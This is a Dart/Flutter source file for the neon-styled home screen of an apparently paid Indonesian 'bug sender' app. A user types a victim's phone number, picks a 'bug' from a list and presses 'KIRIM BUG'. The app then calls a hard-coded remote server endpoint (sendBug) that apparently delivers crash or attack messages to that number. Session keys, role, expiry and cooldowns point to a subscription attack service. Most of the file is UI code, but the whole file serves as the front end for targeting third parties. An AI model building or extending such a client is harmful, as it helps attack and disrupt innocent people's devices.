import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:chewie/chewie.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _fadeController;
  late AnimationController _pulseController;
  late AnimationController _slideController;
  late AnimationController _rotateController;
  late Animation<Offset> _slideAnimation;
  String selectedBugId = "";

  bool _isSending = false;
  String? _responseMessage;

  // Video Player Variables
  late VideoPlayerController _videoController;
  late ChewieController _chewieController;
  bool _isVideoInitialized = false;

  // --- PERUBAHAN TEMA WARNA NEON ---
  // Warna neon yang cerah dan kece
  final Color neonBlue = const Color(0xFF00F3FF); // Neon cyan/blue
  final Color neonPink = const Color(0xFFFF10F0); // Neon pink
  final Color neonPurple = const Color(0xFF9D00FF); // Neon purple
  final Color neonGreen = const Color(0xFF39FF14); // Neon green
  final Color neonYellow = const Color(0xFFFFE600); // Neon yellow
  final Color glassBlack = Colors.black.withOpacity(0.3);

  @override
  void initState() {
    super.initState();
    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 3),
    )..repeat(reverse: true);

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    _rotateController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 10),
    )..repeat();

    _slideController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    )..forward();

    _slideAnimation = Tween<Offset>(
      begin: const Offset(0, 0.5),
      end: Offset.zero,
    ).animate(CurvedAnimation(
      parent: _slideController,
      curve: Curves.easeOutCubic,
    ));

    if (widget.listBug.isNotEmpty) {
      selectedBugId = widget.listBug[0]['bug_id'];
    }

    // Initialize video player from assets
    _initializeVideoPlayer();
  }

  void _initializeVideoPlayer() {
    _videoController = VideoPlayerController.asset(
      'assets/videos/bg.mp4',
    );

    _videoController.initialize().then((_) {
      setState(() {
        _videoController.setVolume(0.1);
        _chewieController = ChewieController(
          videoPlayerController: _videoController,
          autoPlay: true,
          looping: true,
          showControls: false,
          autoInitialize: true,
          errorBuilder: (context, errorMessage) {
            return Container(
              height: 120,
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [neonBlue.withOpacity(0.3), neonPink.withOpacity(0.3)],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(20),
              ),
              child: Center(
                child: Icon(
                  Icons.play_arrow, 
                  color: neonBlue, 
                  size: 40,
                  shadows: [
                    Shadow(color: neonPink, blurRadius: 10),
                  ],
                ),
              ),
            );
          },
        );
        _isVideoInitialized = true;
      });
    }).catchError((error) {
      print("Video initialization error: $error");
      setState(() {
        _isVideoInitialized = false;
      });
    });
  }

  @override
  void dispose() {
    _fadeController.dispose();
    _pulseController.dispose();
    _slideController.dispose();
    _rotateController.dispose();
    targetController.dispose();
    _videoController.dispose();
    _chewieController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
    return cleaned;
  }

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final target = formatPhoneNumber(rawInput);
    final key = widget.sessionKey;

    if (target == null || key.isEmpty) {
      _showAlert("❌ Invalid Number",
          "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
      return;
    }

    setState(() {
      _isSending = true;
      _responseMessage = null;
    });

    try {
      final res = await http.get(Uri.parse(
          "http://yakuzaprib.omdhangantenk.biz.id:2000/sendBug?key=$key&target=$target&bug=$selectedBugId"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        setState(() => _responseMessage = "⏳ Cooldown: Tunggu beberapa saat.");
      } else if (data["valid"] == false) {
        setState(() => _responseMessage = "❌ Key Invalid: Silakan login ulang.");
      } else if (data["sended"] == false) {
        setState(() => _responseMessage =
        "⚠️ Gagal: Server sedang maintenance.");
      } else {
        setState(() => _responseMessage = "✅ Berhasil mengirim bug ke $target!");
        targetController.clear();
      }
    } catch (_) {
      setState(() =>
      _responseMessage = "❌ Error: Terjadi kesalahan. Coba lagi.");
    } finally {
      setState(() {
        _isSending = false;
      });
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 15, sigmaY: 15),
        child: AlertDialog(
          backgroundColor: glassBlack,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(24),
            side: BorderSide(
              color: neonBlue.withOpacity(0.5), 
              width: 2,
            ),
          ),
          title: ShaderMask(
            shaderCallback: (bounds) => LinearGradient(
              colors: [neonBlue, neonPink],
            ).createShader(bounds),
            child: Text(title, style: const TextStyle(fontWeight: FontWeight.bold)),
          ),
          content: Text(msg, style: const TextStyle(color: Colors.white70)),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: Text(
                "OK", 
                style: TextStyle(
                  color: neonBlue,
                  shadows: [
                    Shadow(color: neonPink, blurRadius: 5),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildGlassCard({required Widget child, EdgeInsetsGeometry? padding}) {
    return Container(
      margin: const EdgeInsets.symmetric(vertical: 8),
      padding: padding ?? const EdgeInsets.all(20),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            Colors.white.withOpacity(0.1),
            Colors.white.withOpacity(0.05),
          ],
        ),
        borderRadius: BorderRadius.circular(24),
        border: Border.all(
          color: neonBlue.withOpacity(0.3),
          width: 1.5,
        ),
        boxShadow: [
          BoxShadow(
            color: neonBlue.withOpacity(0.2),
            blurRadius: 20,
            spreadRadius: 1,
          ),
          BoxShadow(
            color: neonPink.withOpacity(0.1),
            blurRadius: 30,
            spreadRadius: -5,
          ),
        ],
      ),
      child: child,
    );
  }

  Widget _buildHeaderPanel() {
    return SlideTransition(
      position: _slideAnimation,
      child: Container(
        margin: const EdgeInsets.symmetric(vertical: 8),
        height: 240,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(24),
          boxShadow: [
            BoxShadow(
              color: neonBlue.withOpacity(0.3),
              blurRadius: 25,
              spreadRadius: 2,
            ),
            BoxShadow(
              color: neonPink.withOpacity(0.2),
              blurRadius: 40,
              spreadRadius: -5,
            ),
          ],
        ),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(24),
          child: Stack(
            fit: StackFit.expand,
            children: [
              // Video Background
              if (_isVideoInitialized)
                Chewie(controller: _chewieController)
              else
                Container(
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [neonBlue.withOpacity(0.3), neonPink.withOpacity(0.3)],
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                    ),
                  ),
                  child: Center(
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(
                          Icons.play_arrow, 
                          color: neonBlue, 
                          size: 40,
                          shadows: [
                            Shadow(color: neonPink, blurRadius: 10),
                          ],
                        ),
                        const SizedBox(height: 8),
                        Text(
                          "Loading Video...",
                          style: TextStyle(
                            color: neonBlue,
                            shadows: [
                              Shadow(color: neonPink, blurRadius: 5),
                            ],
                          ),
                        ),
                      ],
                    ),
                  ),
                ),

              // Gradient Overlay dengan efek neon
              Container(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [
                      Colors.black.withOpacity(0.6),
                      Colors.transparent,
                      Colors.black.withOpacity(0.7),
                    ],
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    stops: const [0.0, 0.5, 1.0],
                  ),
                ),
              ),

              // Neon border effect
              Positioned(
                top: 0,
                left: 0,
                right: 0,
                child: Container(
                  height: 2,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [neonBlue, neonPink, neonPurple],
                    ),
                  ),
                ),
              ),

              // Glassmorphism Content
              BackdropFilter(
                filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
                child: Container(
                  padding: const EdgeInsets.all(20),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.05),
                    borderRadius: BorderRadius.circular(24),
                  ),
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      // Animated Logo dengan efek rotate
                      FadeTransition(
                        opacity: Tween(begin: 0.6, end: 1.0).animate(_fadeController),
                        child: RotationTransition(
                          turns: Tween(begin: 0.0, end: 1.0).animate(_rotateController),
                          child: Container(
                            padding: const EdgeInsets.all(4),
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              gradient: LinearGradient(
                                colors: [neonBlue.withOpacity(0.4), neonPink.withOpacity(0.4)],
                                begin: Alignment.topLeft,
                                end: Alignment.bottomRight,
                              ),
                              boxShadow: [
                                BoxShadow(
                                  color: neonBlue.withOpacity(0.5),
                                  blurRadius: 20,
                                  spreadRadius: 3,
                                ),
                                BoxShadow(
                                  color: neonPink.withOpacity(0.3),
                                  blurRadius: 30,
                                  spreadRadius: -5,
                                ),
                              ],
                            ),
                            child: const CircleAvatar(
                              radius: 40,
                              backgroundImage: AssetImage('assets/images/logo.jpg'),
                            ),
                          ),
                        ),
                      ),
                      const SizedBox(height: 16),

                      // Username dengan efek neon
                      ShaderMask(
                        shaderCallback: (bounds) => LinearGradient(
                          colors: [neonBlue, neonPink],
                        ).createShader(bounds),
                        child: Text(
                          widget.username,
                          style: const TextStyle(
                            fontWeight: FontWeight.bold,
                            fontSize: 22,
                            letterSpacing: 1.2,
                          ),
                        ),
                      ),

                      const SizedBox(height: 8),

                      // Role & Expiry dengan style neon
                      Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                            decoration: BoxDecoration(
                              color: neonBlue.withOpacity(0.15),
                              borderRadius: BorderRadius.circular(12),
                              border: Border.all(
                                color: neonBlue.withOpacity(0.6),
                                width: 1.5,
                              ),
                              boxShadow: [
                                BoxShadow(
                                  color: neonBlue.withOpacity(0.3),
                                  blurRadius: 10,
                                ),
                              ],
                            ),
                            child: Text(
                              widget.role.toUpperCase(),
                              style: TextStyle(
                                color: neonBlue,
                                fontSize: 12,
                                fontWeight: FontWeight.bold,
                                shadows: [
                                  Shadow(color: neonPink, blurRadius: 5),
                                ],
                              ),
                            ),
                          ),
                          const SizedBox(width: 8),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                            decoration: BoxDecoration(
                              color: neonPink.withOpacity(0.15),
                              borderRadius: BorderRadius.circular(12),
                              border: Border.all(
                                color: neonPink.withOpacity(0.6),
                                width: 1.5,
                              ),
                              boxShadow: [
                                BoxShadow(
                                  color: neonPink.withOpacity(0.3),
                                  blurRadius: 10,
                                ),
                              ],
                            ),
                            child: Text(
                              "Exp: ${widget.expiredDate}",
                              style: TextStyle(
                                color: neonPink,
                                fontSize: 12,
                                shadows: [
                                  Shadow(color: neonBlue, blurRadius: 5),
                                ],
                              ),
                            ),
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInputPanel() {
    return SlideTransition(
      position: _slideAnimation,
      child: _buildGlassCard(
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            // Phone Input dengan icon neon
            Row(
              children: [
                Icon(
                  Icons.phone_android,
                  color: neonBlue,
                  shadows: [
                    Shadow(color: neonPink, blurRadius: 5),
                  ],
                ),
                const SizedBox(width: 8),
                Text(
                  "Nomor Target",
                  style: TextStyle(
                    color: neonBlue,
                    fontWeight: FontWeight.bold,
                    fontSize: 16,
                    shadows: [
                      Shadow(color: neonPink, blurRadius: 5),
                    ],
                  ),
                ),
              ],
            ),
            const SizedBox(height: 12),
            Container(
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(16),
                gradient: LinearGradient(
                  colors: [
                    Colors.white.withOpacity(0.1),
                    Colors.white.withOpacity(0.05),
                  ],
                ),
                border: Border.all(
                  color: neonBlue.withOpacity(0.3),
                  width: 1,
                ),
              ),
              child: TextField(
                controller: targetController,
                style: const TextStyle(color: Colors.white),
                cursorColor: neonBlue,
                decoration: InputDecoration(
                  hintText: "Contoh: +62xxxxxxxxxx",
                  hintStyle: TextStyle(color: Colors.white.withOpacity(0.5)),
                  filled: false,
                  border: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(16),
                    borderSide: BorderSide.none,
                  ),
                  focusedBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(16),
                    borderSide: BorderSide(
                      color: neonBlue,
                      width: 2,
                    ),
                  ),
                  enabledBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(16),
                    borderSide: BorderSide.none,
                  ),
                  contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 16),
                  prefixIcon: Icon(
                    Icons.phone,
                    color: neonBlue.withOpacity(0.5),
                  ),
                  suffixIcon: IconButton(
                    icon: Icon(
                      Icons.clear,
                      color: neonBlue.withOpacity(0.5),
                    ),
                    onPressed: () => targetController.clear(),
                  ),
                ),
              ),
            ),

            const SizedBox(height: 24),

            // Bug Selection dengan style modern
            Row(
              children: [
                Icon(
                  Icons.bug_report,
                  color: neonPink,
                  shadows: [
                    Shadow(color: neonBlue, blurRadius: 5),
                  ],
                ),
                const SizedBox(width: 8),
                Text(
                  "Pilih Bug",
                  style: TextStyle(
                    color: neonPink,
                    fontWeight: FontWeight.bold,
                    fontSize: 16,
                    shadows: [
                      Shadow(color: neonBlue, blurRadius: 5),
                    ],
                  ),
                ),
              ],
            ),
            const SizedBox(height: 12),
            
            // Custom dropdown dengan style neon
            Container(
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(16),
                gradient: LinearGradient(
                  colors: [
                    neonBlue.withOpacity(0.1),
                    neonPink.withOpacity(0.1),
                  ],
                ),
                border: Border.all(
                  color: neonPink.withOpacity(0.3),
                  width: 1.5,
                ),
              ),
              child: DropdownButtonHideUnderline(
                child: DropdownButton<String>(
                  dropdownColor: Colors.black.withOpacity(0.9),
                  value: selectedBugId,
                  isExpanded: true,
                  icon: Icon(
                    Icons.keyboard_arrow_down,
                    color: neonPink,
                  ),
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 16,
                  ),
                  items: widget.listBug.map((bug) {
                    return DropdownMenuItem<String>(
                      value: bug['bug_id'],
                      child: Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 16),
                        child: Row(
                          children: [
                            Icon(
                              Icons.bug_report,
                              color: neonBlue,
                              size: 18,
                            ),
                            const SizedBox(width: 8),
                            Text(
                              bug['bug_name'],
                              style: const TextStyle(color: Colors.white),
                            ),
                          ],
                        ),
                      ),
                    );
                  }).toList(),
                  onChanged: (value) {
                    setState(() {
                      selectedBugId = value ?? "";
                    });
                  },
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSendButton() {
    return SlideTransition(
      position: _slideAnimation,
      child: AnimatedBuilder(
        animation: _pulseController,
        builder: (context, child) {
          return Container(
            margin: const EdgeInsets.only(top: 16),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(30),
              gradient: LinearGradient(
                colors: [
                  neonBlue,
                  neonPink,
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              boxShadow: [
                BoxShadow(
                  color: neonBlue.withOpacity(0.5 * _pulseController.value),
                  blurRadius: 30 * _pulseController.value,
                  spreadRadius: 2 * _pulseController.value,
                ),
                BoxShadow(
                  color: neonPink.withOpacity(0.5 * _pulseController.value),
                  blurRadius: 30 * _pulseController.value,
                  spreadRadius: -5 * _pulseController.value,
                ),
              ],
            ),
            child: ElevatedButton(
              onPressed: _isSending ? null : _sendBug,
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                shadowColor: Colors.transparent,
                padding: const EdgeInsets.symmetric(vertical: 18),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(30),
                ),
              ),
              child: _isSending
                  ? const SizedBox(
                      height: 24,
                      width: 24,
                      child: CircularProgressIndicator(
                        color: Colors.white,
                        strokeWidth: 3,
                      ),
                    )
                  : Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(
                          Icons.send,
                          color: Colors.white,
                          size: 22,
                        ),
                        const SizedBox(width: 12),
                        Text(
                          "KIRIM BUG",
                          style: TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.bold,
                            fontSize: 18,
                            letterSpacing: 1.5,
                            shadows: [
                              Shadow(
                                color: Colors.black.withOpacity(0.3),
                                blurRadius: 5,
                              ),
                            ],
                          ),
                        ),
                      ],
                    ),
            ),
          );
        },
      ),
    );
  }

  Widget _buildResponseMessage() {
    if (_responseMessage == null) return const SizedBox.shrink();

    return SlideTransition(
      position: _slideAnimation,
      child: Container(
        margin: const EdgeInsets.only(top: 20),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: _responseMessage!.startsWith('✅')
                ? [neonGreen.withOpacity(0.2), neonGreen.withOpacity(0.1)]
                : [Colors.red.withOpacity(0.2), Colors.red.withOpacity(0.1)],
          ),
          borderRadius: BorderRadius.circular(20),
          border: Border.all(
            color: _responseMessage!.startsWith('✅')
                ? neonGreen.withOpacity(0.5)
                : Colors.red.withOpacity(0.5),
            width: 1.5,
          ),
        ),
        child: Row(
          children: [
            Icon(
              _responseMessage!.startsWith('✅') ? Icons.check_circle : Icons.error,
              color: _responseMessage!.startsWith('✅') ? neonGreen : Colors.red,
              size: 24,
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Text(
                _responseMessage!,
                style: TextStyle(
                  color: _responseMessage!.startsWith('✅') ? neonGreen : Colors.red,
                  fontWeight: FontWeight.bold,
                  fontSize: 14,
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          // Animated background effects
          AnimatedBuilder(
            animation: _rotateController,
            builder: (context, child) {
              return Stack(
                children: [
                  Positioned(
                    top: -100,
                    right: -100,
                    child: Transform.rotate(
                      angle: _rotateController.value * 2 * 3.14,
                      child: Container(
                        width: 300,
                        height: 300,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          gradient: RadialGradient(
                            colors: [
                              neonBlue.withOpacity(0.1),
                              Colors.transparent,
                            ],
                          ),
                        ),
                      ),
                    ),
                  ),
                  Positioned(
                    bottom: -150,
                    left: -100,
                    child: Transform.rotate(
                      angle: -_rotateController.value * 2 * 3.14,
                      child: Container(
                        width: 400,
                        height: 400,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          gradient: RadialGradient(
                            colors: [
                              neonPink.withOpacity(0.08),
                              Colors.transparent,
                            ],
                          ),
                        ),
                      ),
                    ),
                  ),
                ],
              );
            },
          ),

          // Grid lines effect
          CustomPaint(
            painter: NeonGridPainter(neonBlue, neonPink),
            child: Container(),
          ),

          BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
            child: SafeArea(
              child: SingleChildScrollView(
                padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.center,
                  children: [
                    _buildHeaderPanel(),
                    const SizedBox(height: 24),
                    _buildInputPanel(),
                    _buildSendButton(),
                    _buildResponseMessage(),
                    const SizedBox(height: 20),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

// Custom painter untuk efek grid neon
class NeonGridPainter extends CustomPainter {
  final Color neonBlue;
  final Color neonPink;

  NeonGridPainter(this.neonBlue, this.neonPink);

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = neonBlue.withOpacity(0.1)
      ..strokeWidth = 0.5
      ..style = PaintingStyle.stroke;

    // Garis vertikal
    for (double i = 0; i < size.width; i += 50) {
      canvas.drawLine(Offset(i, 0), Offset(i, size.height), paint);
    }

    // Garis horizontal
    for (double i = 0; i < size.height; i += 50) {
      canvas.drawLine(Offset(0, i), Offset(size.width, i), paint);
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}